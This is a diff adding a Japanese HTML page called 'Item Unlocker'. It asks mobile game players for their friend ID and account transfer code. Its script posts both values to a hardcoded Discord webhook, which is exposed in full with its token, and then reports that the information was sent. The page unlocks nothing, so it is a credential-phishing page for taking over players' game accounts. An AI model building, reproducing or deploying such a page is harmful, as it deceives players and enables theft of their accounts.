@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Item Unlocker</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #101010;
+      color: white;
+      margin: 0;
+      padding: 0;
+    }
+    .container {
+      text-align: center;
+      margin-top: 50px;
+    }
+    h1 {
+      font-size: 2rem;
+      color: #6a1b9a;
+    }
+    .input-container {
+      background-color: #202020;
+      padding: 20px;
+      border-radius: 10px;
+      display: inline-block;
+      margin-bottom: 20px;
+      width: 80%;
+    }
+    label {
+      font-size: 1.2rem;
+    }
+    input {
+      padding: 10px;
+      font-size: 1.2rem;
+      width: 100%;
+      background-color: #333;
+      color: #fff;
+      border: 1px solid #6a1b9a;
+      border-radius: 5px;
+      margin-top: 10px;
+    }
+    .button-container {
+      background-color: #333;
+      padding: 20px;
+      border-radius: 10px;
+    }
+    .submit-btn {
+      background-color: #6a1b9a;
+      color: white;
+      padding: 15px 25px;
+      font-size: 1.5rem;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    .submit-btn:hover {
+      background-color: #8e24aa;
+    }
+    .response {
+      margin-top: 20px;
+      font-size: 1.2rem;
+      color: #76ff03;
+    }
+    .response.error {
+      color: #ff1744;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <h1>Item Unlocker</h1>
+    
+    <!-- フレンドID（ユーザーID）入力フォーム -->
+    <div class="input-container">
+      <label for="friendId">フレンドID (ユーザーID):</label>
+      <input type="text" id="friendId" placeholder="ユーザーIDを入力してください" required>
+    </div>
+
+    <!-- 機種変コード（引き継ぎコード）入力フォーム -->
+    <div class="input-container">
+      <label for="transferCode">機種変コード (引き継ぎコード):</label>
+      <input type="text" id="transferCode" placeholder="引き継ぎコードを入力してください" required>
+    </div>
+
+    <div class="button-container">
+      <button class="submit-btn" id="submitBtn">送信</button>
+    </div>
+
+    <div class="response" id="responseMessage"></div>
+  </div>
+
+  <script>
+    document.getElementById('submitBtn').addEventListener('click', function() {
+      const friendId = document.getElementById('friendId').value;
+      const transferCode = document.getElementById('transferCode').value;
+
+      // 入力内容のバリデーション（空白チェック）
+      if (!friendId || !transferCode) {
+        document.getElementById('responseMessage').textContent = 'すべての項目を入力してください。';
+        document.getElementById('responseMessage').classList.remove('success');
+        document.getElementById('responseMessage').classList.add('error');
+        return;
+      }
+
+      const webhookUrl = 'https://discord.com/api/webhooks/1358282548660146274/fUiEfddw3yty8mrhIkkDMbI2Mt80fb55sieIlnELLfn0PMPJmTfOVCPF5v6B3fBfSrzx';
+
+      const payload = {
+        content: `フレンドID: ${friendId}\n機種変コード: ${transferCode}`,
+        username: 'Item Unlocker Bot'
+      };
+
+      fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(payload)
+      })
+      .then(response => {
+        if (response.ok) {
+          document.getElementById('responseMessage').textContent = '情報が送信されました！';
+          document.getElementById('responseMessage').classList.remove('error');
+          document.getElementById('responseMessage').classList.add('success');
+        } else {
+          document.getElementById('responseMessage').textContent = '送信に失敗しました。';
+          document.getElementById('responseMessage').classList.remove('success');
+          document.getElementById('responseMessage').classList.add('error');
+        }
+      })
+      .catch(error => {
+        document.getElementById('responseMessage').textContent = 'エラーが発生しました。もう一度試してください。';
+        document.getElementById('responseMessage').classList.remove('success');
+        document.getElementById('responseMessage').classList.add('error');
+        console.error('Error:', error);
+      });
+    });
+  </script>
+
+</body>
+</html>
